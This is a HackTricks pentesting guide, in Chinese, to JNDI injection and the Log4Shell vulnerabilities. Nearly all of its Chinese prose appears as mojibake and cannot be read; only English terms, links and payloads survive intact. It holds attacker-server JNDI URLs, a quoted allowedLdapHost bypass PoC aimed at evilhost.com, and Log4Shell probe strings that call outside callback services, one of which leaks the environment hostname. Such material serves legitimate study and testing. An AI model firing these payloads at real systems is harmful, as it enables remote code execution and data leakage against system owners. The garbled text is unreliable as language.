# JNDI - Javaå‘½åå’Œç›®å½•æ¥å£ä¸Log4Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

JNDIè‡ªä¸Šä¸–çºª90å¹´ä»£æœ«ä»¥æ¥ä¸€ç›´å­˜åœ¨äºJavaä¸­ã€‚å®ƒæ˜¯ä¸€ä¸ªç›®å½•æœåŠ¡ï¼Œ**å…è®¸Javaç¨‹åºé€šè¿‡åç§°æœåŠ¡åœ¨ç›®å½•ä¸­æŸ¥æ‰¾æ•°æ®**ã€‚åç§°æœåŠ¡å…³è”å€¼ï¼ˆç»‘å®šï¼‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å…¶åœ¨ç›®å½•ä¸­çš„å¼•ç”¨æ¥è·å–å®ƒã€‚

JNDIå…·æœ‰å¤šä¸ª**æœåŠ¡æä¾›è€…æ¥å£**ï¼ˆSPIï¼‰ï¼Œä½¿å…¶èƒ½å¤Ÿä½¿ç”¨å„ç§ç›®å½•æœåŠ¡ã€‚JNDIçš„ç›®æ ‡æ˜¯éå¸¸å®¹æ˜“åœ°ä»å…¶ä»–ç³»ç»Ÿè·å–æ•°æ®ã€‚ç”šè‡³å¯ä»¥è¿œç¨‹è·å–Javaå¯¹è±¡ï¼Œè¿™å°±æ˜¯é—®é¢˜çš„æ‰€åœ¨ã€‚

ä¾‹å¦‚ï¼ŒSPIå­˜åœ¨äº**CORBA COS**ï¼ˆé€šç”¨å¯¹è±¡æœåŠ¡ï¼‰ï¼Œ**Java RMI**ï¼ˆè¿œç¨‹æ–¹æ³•æ¥å£ï¼‰æ³¨å†Œè¡¨å’Œ**LDAP**ä¸­ã€‚

![](<../../.gitbook/assets/image (627).png>)

### JNDIå‘½åå¼•ç”¨

ä¸ºäº†æ£€ç´¢Javaå¯¹è±¡ï¼Œæ‚¨å¯ä»¥å°†å®ƒä»¬åºåˆ—åŒ–å¹¶ä¿å­˜ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºã€‚ä½†æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•è¡Œä¸é€šï¼ˆå¯èƒ½æ˜¯å› ä¸ºæ•°æ®å¤ªå¤§æˆ–å…¶ä»–åŸå› ï¼‰ã€‚\
ä¸ºäº†æ›´è½»æ¾åœ°ä¿å­˜Javaå¯¹è±¡ï¼Œä½¿ç”¨**å‘½åå¼•ç”¨**ã€‚\
æœ‰ä¸¤ç§ç±»å‹çš„å‘½åå¼•ç”¨ï¼š

* **å¼•ç”¨åœ°å€**ï¼šè¿™è¡¨ç¤ºå¯¹è±¡çš„åœ°å€ï¼ˆ_rmi://server/ref_ï¼‰ï¼Œç„¶åå°†ä»è¯¥åœ°å€**æ£€ç´¢å¯¹è±¡**ã€‚
* **è¿œç¨‹å·¥å‚**ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒJNDIå¼•ç”¨ä¸­å°†æŒ‡å‘ä¸€ä¸ª**è¿œç¨‹å·¥å‚ç±»**ï¼Œç„¶åï¼Œæ ¹æ®JNDIåœ°å€ï¼Œå°†ä»è¿œç¨‹å·¥å‚è·å–å¹¶åŠ è½½**ç±»**ã€‚

è¿™æ˜¯å±é™©çš„ï¼Œå› ä¸º**æ”»å‡»è€…å¯èƒ½ä½¿ç³»ç»ŸåŠ è½½ä»»æ„å¯¹è±¡å¹¶æ‰§è¡Œä»»æ„ä»£ç **ï¼Œå› æ­¤å­˜åœ¨ä¸€äº›ä¿æŠ¤æªæ–½ï¼š

* **RMI**ï¼šè‡ª**JDK 7u21**ä»¥æ¥ï¼Œé»˜è®¤æƒ…å†µä¸‹`java.rmi.server.useCodeabseOnly = true`ï¼Œå¦åˆ™å®ƒå°†å…è®¸è¿œç¨‹åŠ è½½è‡ªå®šä¹‰Javaå¯¹è±¡ã€‚æ­¤å¤–ï¼Œå³ä½¿ç¦ç”¨äº†ä¿æŠ¤æªæ–½ï¼Œä¹Ÿä¼šå¼ºåˆ¶æ‰§è¡Œ**å®‰å…¨ç®¡ç†å™¨**ä»¥é…ç½®å¯ä»¥åŠ è½½çš„å†…å®¹ã€‚
* **LDAP**ï¼šè‡ª**JDK 6u141ã€7u131ã€8u121**ä»¥æ¥ï¼Œé»˜è®¤æƒ…å†µä¸‹`com.sun.jndi.ldap.object.trustURLCodebase = false`ï¼Œå®ƒä¸å…è®¸æ‰§è¡Œä¸‹è½½çš„ä»»æ„Javaå¯¹è±¡ã€‚ä½†æ˜¯ï¼Œå¦‚æœå°†å…¶è®¾ç½®ä¸º`true`ï¼Œåˆ™å¯ä»¥æ‰§è¡Œï¼Œå¹¶ä¸”**ä¸ä¼šå¼ºåˆ¶æ‰§è¡Œå®‰å…¨ç®¡ç†å™¨**ã€‚
* **CORBA**ï¼šæ²¡æœ‰è¦é…ç½®çš„å±æ€§ï¼Œä½†å§‹ç»ˆå¼ºåˆ¶æ‰§è¡Œ**å®‰å…¨ç®¡ç†å™¨**ã€‚

æ­¤å¤–ï¼Œ**å‘½åç®¡ç†å™¨**ï¼ˆå°†è·ŸéšJNDIé“¾æ¥çš„ç®¡ç†å™¨ï¼‰æ²¡æœ‰ä»»ä½•å®‰å…¨ç®¡ç†å™¨æˆ–è¦é…ç½®çš„å±æ€§ï¼Œå› æ­¤å®ƒå°†å§‹ç»ˆå°è¯•è·å–å¯¹è±¡ã€‚

æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œ**é€šå¸¸çš„ä¿æŠ¤æªæ–½æ˜¯ä¸å¤Ÿçš„**ï¼Œå› ä¸ºæ²¡æœ‰é˜²æ­¢ä»éšæœºåœ°å€åŠ è½½JNDIçš„ä¿æŠ¤ï¼Œå¹¶ä¸”å¯ä»¥ç»•è¿‡RMIã€LDAPå’ŒCORBAçš„ä¿æŠ¤æªæ–½ï¼ˆå–å†³äºé…ç½®ï¼‰æ¥åŠ è½½ä»»æ„Javaå¯¹è±¡æˆ–åŠ è½½æ»¥ç”¨åº”ç”¨ç¨‹åºä¸­ç°æœ‰ç»„ä»¶çš„Javaå¯¹è±¡ä½œä¸ºæ‰§è¡Œä»»æ„ä»£ç çš„**gadget**ã€‚

æ»¥ç”¨JNDIçš„URLç¤ºä¾‹ï¼š

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDIç¤ºä¾‹

![](<../../.gitbook/assets/image (655) (1) (1).png>)

å³ä½¿æ‚¨è®¾ç½®äº†**`PROVIDER_URL`**ï¼Œæ‚¨ä¹Ÿå¯ä»¥åœ¨æŸ¥æ‰¾ä¸­æŒ‡å®šä¸åŒçš„URLå¹¶è®¿é—®å®ƒï¼š`ctx.lookup("<attacker-controlled-url>")`ï¼Œè¿™å°±æ˜¯æ”»å‡»è€…æ»¥ç”¨ç³»ç»Ÿä»ä»–æ§åˆ¶çš„ç³»ç»ŸåŠ è½½ä»»æ„å¯¹è±¡çš„æ–¹å¼ã€‚

### CORBA

**å¯äº’æ“ä½œå¯¹è±¡å¼•ç”¨ï¼ˆIORï¼‰**æ˜¯CORBAæˆ–RMI-IIOPå¼•ç”¨ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†è¿œç¨‹CORBAæœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚IORå¯ä»¥æ˜¯äºŒè¿›åˆ¶æ ¼å¼æˆ–äºŒè¿›åˆ¶çš„åå…­è¿›åˆ¶è¡¨ç¤ºå½¢å¼ã€‚\
é™¤å…¶ä»–ä¿¡æ¯å¤–ï¼Œå®ƒåŒ…å«**ç±»å‹ID**ï¼ˆæ¥å£çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼‰å’Œ**ä»£ç åº“**ï¼ˆç”¨äºè·å–å­˜æ ¹ç±»çš„è¿œç¨‹ä½ç½®ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹æ— æ³•æ»¥ç”¨**CORBA**ã€‚\
å®ƒéœ€è¦ï¼š

* å¿…é¡»å®‰è£…**å®‰å…¨ç®¡ç†å™¨**
* å®‰å…¨ç®¡ç†å™¨å¿…é¡»å…è®¸è¿æ¥åˆ°æ”»å‡»è€…æ§åˆ¶çš„ä»£ç åº“ã€‚æœ‰å¤šç§æ–¹æ³•å¯ä»¥å…è®¸æ­¤æ“ä½œï¼š
* Socketæƒé™ï¼š`permissions java.net.SocketPermission "*:1098-1099", "connect";`
* å…è®¸è¯»å–æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶æƒé™ï¼š`permission java.io.FilePermission "<<ALL FILES>>", "read";`
* å…è®¸è¯»å–æ”»å‡»è€…å¯ä»¥ä¸Šä¼ åˆ©ç”¨ç¨‹åºï¼ˆç±»æˆ–zipå½’æ¡£ï¼‰çš„æ–‡ä»¶å¤¹çš„æ–‡ä»¶æƒé™

æ‚¨å¯èƒ½ä¼šå‘ç°**é»˜è®¤æƒ…å†µä¸‹å…è®¸æ­¤æ“ä½œçš„ä¾›åº”å•†ç­–ç•¥**ã€‚
### RMI

å¦‚å‰é¢çš„**JNDIå‘½åå‚è€ƒéƒ¨åˆ†æ‰€ç¤ºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒRMIä¸å…è®¸ä¸‹è½½ä»»æ„çš„Javaç±»**ã€‚è€Œä¸”ï¼Œå³ä½¿å…è®¸ä¸‹è½½ï¼Œä½ è¿˜éœ€è¦**ç»•è¿‡å®‰å…¨ç®¡ç†å™¨ç­–ç•¥**ï¼ˆåœ¨å‰é¢çš„éƒ¨åˆ†ä¸­æˆ‘ä»¬å­¦åˆ°äº†è¿™æ˜¯é€šè¿‡CORBAå®ç°çš„ï¼‰ã€‚

### LDAP

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åŒºåˆ†æœç´¢å’ŒæŸ¥æ‰¾ã€‚\
**æœç´¢**å°†ä½¿ç”¨ç±»ä¼¼`ldap://localhost:389/o=JNDITutorial`çš„URLæ¥ä»LDAPæœåŠ¡å™¨ä¸­æŸ¥æ‰¾JNDITutorialå¯¹è±¡å¹¶**æ£€ç´¢å…¶å±æ€§**ã€‚\
**æŸ¥æ‰¾**ç”¨äº**å‘½åæœåŠ¡**ï¼Œæˆ‘ä»¬æƒ³è¦è·å–**ç»‘å®šåˆ°åç§°çš„ä»»ä½•å†…å®¹**ã€‚

å¦‚æœLDAPæœç´¢ä½¿ç”¨äº†**SearchControls.setReturningObjFlag()å¹¶è®¾ç½®ä¸º`true`**ï¼Œé‚£ä¹ˆè¿”å›çš„å¯¹è±¡å°†è¢«é‡å»ºã€‚

å› æ­¤ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥æ”»å‡»è¿™äº›é€‰é¡¹ã€‚\
æ”»å‡»è€…å¯ä»¥åœ¨LDAPè®°å½•ä¸­**æ³¨å…¥æœ‰æ•ˆè´Ÿè½½**ï¼Œå¹¶åœ¨æ”¶é›†å®ƒä»¬çš„ç³»ç»Ÿä¸­æ‰§è¡Œå®ƒä»¬ï¼ˆå¦‚æœä½ å¯ä»¥è®¿é—®LDAPæœåŠ¡å™¨ï¼Œè¿™å¯¹äº**æ”»å‡»æ•°åå°æœºå™¨**éå¸¸æœ‰ç”¨ï¼‰ã€‚å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•æ˜¯å¯¹LDAPæœç´¢æ‰§è¡Œ**ä¸­é—´äººæ”»å‡»**ã€‚

å¦‚æœä½ å¯ä»¥**è®©ä¸€ä¸ªåº”ç”¨ç¨‹åºè§£æJNDI LDAP URL**ï¼Œä½ å¯ä»¥æ§åˆ¶å°†è¦æœç´¢çš„LDAPï¼Œå¹¶ä¸”å¯ä»¥å‘é€å›æ¼æ´åˆ©ç”¨ï¼ˆlog4shellï¼‰ã€‚

#### ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**æ¼æ´åˆ©ç”¨è¢«åºåˆ—åŒ–**å¹¶å°†è¢«ååºåˆ—åŒ–ã€‚\
å¦‚æœ`trustURLCodebase`ä¸º`true`ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»£ç åº“ä¸­æä¾›è‡ªå·±çš„ç±»ï¼›å¦‚æœä¸æ˜¯ï¼Œä»–å°†éœ€è¦æ»¥ç”¨ç±»è·¯å¾„ä¸­çš„gadgetã€‚

#### JNDIå¼•ç”¨æ¼æ´åˆ©ç”¨

ä½¿ç”¨**JavaFactoryå¼•ç”¨**æ›´å®¹æ˜“æ”»å‡»æ­¤LDAPï¼š

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shellæ¼æ´

è¯¥æ¼æ´å­˜åœ¨äºLog4jä¸­ï¼Œå› ä¸ºå®ƒæ”¯æŒä¸€ç§[**ç‰¹æ®Šçš„è¯­æ³•**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)ï¼Œå½¢å¼ä¸º`${prefix:name}`ï¼Œå…¶ä¸­`prefix`æ˜¯ä¸€ç³»åˆ—ä¸åŒçš„[**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html)ä¹‹ä¸€ï¼Œ`name`åº”è¯¥è¢«æ±‚å€¼ã€‚ä¾‹å¦‚ï¼Œ`${java:version}`æ˜¯å½“å‰è¿è¡Œçš„Javaç‰ˆæœ¬ã€‚

åœ¨[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)ä¸­æ·»åŠ äº†ä¸€ä¸ª`jndi` Lookupï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼šâ€œJndiLookupå…è®¸é€šè¿‡JNDIæ£€ç´¢å˜é‡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé”®å°†ä»¥java:comp/env/ä¸ºå‰ç¼€ï¼Œä½†æ˜¯å¦‚æœé”®åŒ…å«**":"ï¼Œåˆ™ä¸ä¼šæ·»åŠ å‰ç¼€**ã€‚â€

å¦‚æœé”®ä¸­æœ‰**":"**ï¼Œä¾‹å¦‚`${jndi:ldap://example.com/a}`ï¼Œåˆ™æ²¡æœ‰å‰ç¼€ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢LDAPæœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿™äº›Lookupså¯ä»¥åœ¨Log4jçš„é…ç½®ä»¥åŠè®°å½•è¡Œæ—¶ä½¿ç”¨ã€‚

å› æ­¤ï¼Œå”¯ä¸€éœ€è¦çš„æ˜¯è·å–RCEçš„**å—æ¼æ´å½±å“çš„Log4jç‰ˆæœ¬æ¥å¤„ç†ç”¨æˆ·æ§åˆ¶çš„ä¿¡æ¯**ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªå¹¿æ³›ç”¨äºJavaåº”ç”¨ç¨‹åºè®°å½•ä¿¡æ¯çš„åº“ï¼ˆåŒ…æ‹¬é¢å‘äº’è”ç½‘çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œé€šå¸¸ä¼šä½¿ç”¨log4jè®°å½•ä¾‹å¦‚æ¥æ”¶åˆ°çš„HTTPå¤´ï¼Œå¦‚User-Agentã€‚ç„¶è€Œï¼Œlog4j**ä¸ä»…ç”¨äºè®°å½•HTTPä¿¡æ¯ï¼Œè¿˜å¯ä»¥è®°å½•ä»»ä½•è¾“å…¥å’Œå¼€å‘äººå‘˜æŒ‡å®šçš„æ•°æ®**ã€‚

## Log4Shell CVE

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**ï¼šåŸå§‹çš„â€œLog4Shellâ€æ¼æ´æ˜¯ä¸€ä¸ª[ä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–](https://cwe.mitre.org/data/definitions/502.html)æ¼æ´ã€‚è¯¥æ¼æ´çš„ä¸¥é‡æ€§è¯„ä¸ºä¸¥é‡ï¼Œæ ¹æ®[CVSS](https://www.first.org/cvss/)è¯„åˆ†ï¼Œå®ƒå¾—åˆ†ä¸º10ï¼Œå¹¶**æˆäºˆæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„èƒ½åŠ›**ï¼Œå…è®¸å®Œå…¨æ¥ç®¡ç³»ç»Ÿã€‚\
\
é˜¿é‡Œå·´å·´äº‘å®‰å…¨å›¢é˜Ÿçš„é™ˆå…†å†›äº11æœˆ24æ—¥å‘ApacheæŠ¥å‘Šäº†CVE-2021-44228ï¼Œè¯¥æ¼æ´å½±å“å¤šä¸ªApacheæ¡†æ¶çš„é»˜è®¤é…ç½®ï¼ŒåŒ…æ‹¬Apache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰ã€‚\
\
ä½œä¸ºå…¶ä¸­æœ€å±é™©çš„æ¼æ´ï¼Œè¯¥æ¼æ´å­˜åœ¨äº[log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core)ç»„ä»¶ä¸­ï¼Œä»…é™äº2.xç‰ˆæœ¬ï¼šä»2.0-beta9åˆ°2.14.1ã€‚Log4Shellçš„ä¿®å¤ç‰ˆæœ¬åœ¨2.15.0ä¸­å‘å¸ƒï¼Œä½†è¢«è®¤ä¸ºæ˜¯ä¸å®Œæ•´çš„ï¼ˆç»§ç»­é˜…è¯»ï¼‰ã€‚\
\
å¨èƒæƒ…æŠ¥åˆ†æå¸ˆFlorian Rothåˆ†äº«äº†Sigmaè§„åˆ™\[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)]ï¼Œå¯ä»¥ä½œä¸ºé˜²å¾¡ä¹‹ä¸€ä½¿ç”¨ã€‚\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Critical**ï¼Œä¹‹å‰ä¸ºLow]ï¼šè¿™æ˜¯ä¸€ä¸ªæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ¼æ´ï¼Œè¯„åˆ†ä¸º~~3.7~~ 9.0ã€‚è¯¥æ¼æ´æ˜¯ç”±äºå¯¹CVE-2021-44228çš„2.15.0ç‰ˆæœ¬çš„**ä¸å®Œæ•´ä¿®å¤**è€Œäº§ç”Ÿçš„ã€‚è™½ç„¶2.15.0ç‰ˆæœ¬çš„ä¿®å¤åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šè§£å†³äº†æ¼æ´ï¼Œä½†å¯¹äºæŸäº›**éé»˜è®¤é…ç½®**æ¥è¯´å¹¶éå®Œå…¨å¦‚æ­¤ã€‚\
\
Log4j 2.15.0é€šè¿‡é»˜è®¤æƒ…å†µä¸‹â€œå°½åŠ›å°è¯•â€**é™åˆ¶JNDI LDAPæŸ¥æ‰¾ä¸º\_localhost**\_æ¥è§£å†³æ­¤é—®é¢˜ã€‚ä½†æ˜¯ï¼Œ**æ”»å‡»è€…**å¦‚æœå¯¹**çº¿ç¨‹ä¸Šä¸‹æ–‡æ˜ å°„ï¼ˆMDCï¼‰**è¾“å…¥æ•°æ®å…·æœ‰**æ§åˆ¶æƒ**ï¼Œåˆ™å¯ä»¥é€šè¿‡JNDI Lookupæ¨¡å¼æ„é€ æ¶æ„æœ‰æ•ˆè´Ÿè½½ä»¥å¯¼è‡´DoSæ”»å‡»ã€‚è¿™é€‚ç”¨äºä½¿ç”¨éé»˜è®¤Pattern Layoutçš„éé»˜è®¤é…ç½®ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸Šä¸‹æ–‡æŸ¥æ‰¾ï¼ˆä¾‹å¦‚\$${ctx:loginId}ï¼‰æˆ–çº¿ç¨‹ä¸Šä¸‹æ–‡æ˜ å°„æ¨¡å¼ï¼ˆ%Xã€%mdcæˆ–%MDCï¼‰ã€‚\
\
ä»è¿™ä¸ª[tweet](https://twitter.com/marcioalm/status/1471740771581652995)ä¸­é‡‡ç”¨çš„**ç»•è¿‡æ–¹æ³•**æ˜¯ï¼š\
_è¿™æ˜¯ä¸€ä¸ªç»•è¿‡Log4J 2.15.0ä¸­allowedLdapHostå’ŒallowedClassesæ£€æŸ¥ä»¥å®ç°RCEçš„PoCï¼š`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`ï¼Œè¦ç»•è¿‡allowedClassesï¼Œåªéœ€ä¸ºJDKä¸­çš„ä¸€ä¸ªç±»é€‰æ‹©ä¸€ä¸ªåç§°ã€‚ååºåˆ—åŒ–å°†åƒå¾€å¸¸ä¸€æ ·å‘ç”Ÿã€‚_\
\_\_\
\_\_â€œLog4j 2.16.0é€šè¿‡åˆ é™¤æ¶ˆæ¯æŸ¥æ‰¾æ¨¡å¼çš„æ”¯æŒå¹¶é»˜è®¤ç¦ç”¨JNDIåŠŸèƒ½æ¥ä¿®å¤æ­¤é—®é¢˜ï¼Œâ€NVDå’¨è¯¢å£°æ˜ã€‚å¯¹äº2.12.1åˆ†æ”¯çš„ç”¨æˆ·ï¼Œä¿®å¤å·²ç»å›æº¯åˆ°2.12.2ã€‚\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**ï¼šæˆ‘ä»¬è¯´è¿‡Log4j 2.xç‰ˆæœ¬å­˜åœ¨æ¼æ´å—ï¼Ÿé‚£ä¹ˆ**Log4j 1.x**å‘¢ï¼Ÿ\
\
è™½ç„¶ä¹‹å‰è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œä½†Log4Shellä¹Ÿåœ¨æ—§ç‰ˆLog4jä¸­éšè—ã€‚å®è´¨ä¸Šï¼Œä½¿ç”¨_JMSAppender_ç±»çš„**éé»˜è®¤é…ç½®çš„Log4j 1.xå®ä¾‹ä¹Ÿå®¹æ˜“å—åˆ°ä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–æ¼æ´**çš„å½±å“ã€‚
è™½ç„¶è¿™æ˜¯CVE-2021-44228çš„ä¸€ä¸ªè¾ƒè½»å¾®çš„å˜ç§ï¼Œä½†å®ƒä»ç„¶å½±å“æ‰€æœ‰ç‰ˆæœ¬çš„[log4j:log4j](https://search.maven.org/artifact/log4j/log4j)å’Œ[org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j)ç»„ä»¶ï¼Œåªæœ‰1.xç‰ˆæœ¬å­˜åœ¨ã€‚ç”±äºè¿™äº›æ˜¯[ç»ˆæ­¢æ”¯æŒ](https://logging.apache.org/log4j/1.2/)çš„ç‰ˆæœ¬ï¼Œ**1.xåˆ†æ”¯æ²¡æœ‰ä»»ä½•ä¿®å¤æ–¹æ³•**ï¼Œå› æ­¤åº”è¯¥å‡çº§åˆ°_log4j-core_ 2.17.0ã€‚ï¼ˆæ˜¾ç„¶1.0ä¸å—å½±å“ï¼‰ã€‚\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[ä¸­ç­‰]:** è¿™æ˜¯**Logbackæ—¥å¿—æ¡†æ¶**ä¸­çš„ä¸€ä¸ªæ¼æ´ã€‚ä½œä¸ºLog4j 1.xåº“çš„ç»§ä»»è€…ï¼ŒLogbackå£°ç§°åœ¨â€œlog4j 1.xåœæ­¢ä¹‹åâ€ç»§ç»­å‘å±•ã€‚\
\
ç›´åˆ°ä¸Šå‘¨ï¼ŒLogbackè¿˜[å¹å˜˜](https://archive.md/QkzIy)ä¸log4j 2.xâ€œæ— å…³ï¼Œ\[logback]ä¸å…±äº«å…¶æ¼æ´â€ã€‚\
\
å½“å‘ç°**CVE-2021-4104**ä¹Ÿå½±å“Log4j 1.xï¼Œå¹¶ä¸”è¯„ä¼°äº†å¯¹Logbackçš„æ½œåœ¨å½±å“æ—¶ï¼Œè¿™ç§å‡è®¾å¾ˆå¿«æ¶ˆå¤±äº†ã€‚ç°åœ¨å·²ç»å‘å¸ƒäº†æ–°çš„Logbackç‰ˆæœ¬1.3.0-alpha11å’Œ1.2.9ï¼Œè§£å†³äº†è¿™ä¸ªè¾ƒè½»å¾®çš„æ¼æ´ã€‚[å‘å¸ƒ](https://search.maven.org/artifact/ch.qos.logback/logback-classic)ã€‚\\
* **CVE-2021-45105** **\[é«˜]**: å‘ç°**Log4j 2.16.0**å­˜åœ¨ä¸€ä¸ªè¢«è¯„ä¸ºâ€œé«˜â€ä¸¥é‡æ€§çš„DoSæ¼æ´ã€‚Apacheå·²ç»å‘å¸ƒäº†ä¿®å¤CVEçš„log4j 2.17.0ç‰ˆæœ¬ã€‚æœ‰å…³æ­¤å¼€å‘çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…BleepingComputerçš„[æœ€æ–°æŠ¥å‘Š](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)ã€‚
* [**CVE-2021-44832**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/): è¿™ä¸ªæ–°çš„CVEå½±å“log4jçš„**2.17ç‰ˆæœ¬**ã€‚è¿™ä¸ªæ¼æ´**éœ€è¦æ”»å‡»è€…æ§åˆ¶log4jçš„é…ç½®æ–‡ä»¶**ï¼Œå› ä¸ºå¯ä»¥åœ¨é…ç½®çš„JDBCAppenderä¸­æŒ‡å®šJDNI URLã€‚æœ‰å…³**æ¼æ´å’Œåˆ©ç”¨**çš„ä¿¡æ¯ï¼Œè¯·[**é˜…è¯»æ­¤ä¿¡æ¯**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)ã€‚

## Log4Shellåˆ©ç”¨

### å‘ç°

è¿™ä¸ªæ¼æ´éå¸¸å®¹æ˜“å‘ç°ï¼Œå› ä¸ºå®ƒä¼šå‘æ‚¨åœ¨æœ‰æ•ˆè½½è·ä¸­æŒ‡å®šçš„åœ°å€å‘é€è‡³å°‘ä¸€ä¸ª**DNSè¯·æ±‚**ã€‚å› æ­¤ï¼Œæœ‰æ•ˆè½½è·å¦‚ä¸‹ï¼š

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}`ï¼ˆä½¿ç”¨[canarytokens.com](https://canarytokens.org/generate)ï¼‰
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`ï¼ˆä½¿ç”¨[interactsh](https://github.com/projectdiscovery/interactsh)ï¼‰
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}`ï¼ˆä½¿ç”¨Burp Suiteï¼‰
* `${jndi:ldap://2j4ayo.dnslog.cn}`ï¼ˆä½¿ç”¨[dnslog](http://dnslog.cn)ï¼‰
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}`ï¼ˆä½¿ç”¨[huntress](https://log4shell.huntress.com)ï¼‰

è¯·æ³¨æ„ï¼Œ**å³ä½¿æ”¶åˆ°DNSè¯·æ±‚ï¼Œä¹Ÿä¸æ„å‘³ç€åº”ç”¨ç¨‹åºæ˜¯å¯åˆ©ç”¨çš„**ï¼ˆç”šè‡³æ˜¯æœ‰æ¼æ´çš„ï¼‰ï¼Œæ‚¨éœ€è¦å°è¯•åˆ©ç”¨å®ƒã€‚

{% hint style="info" %}
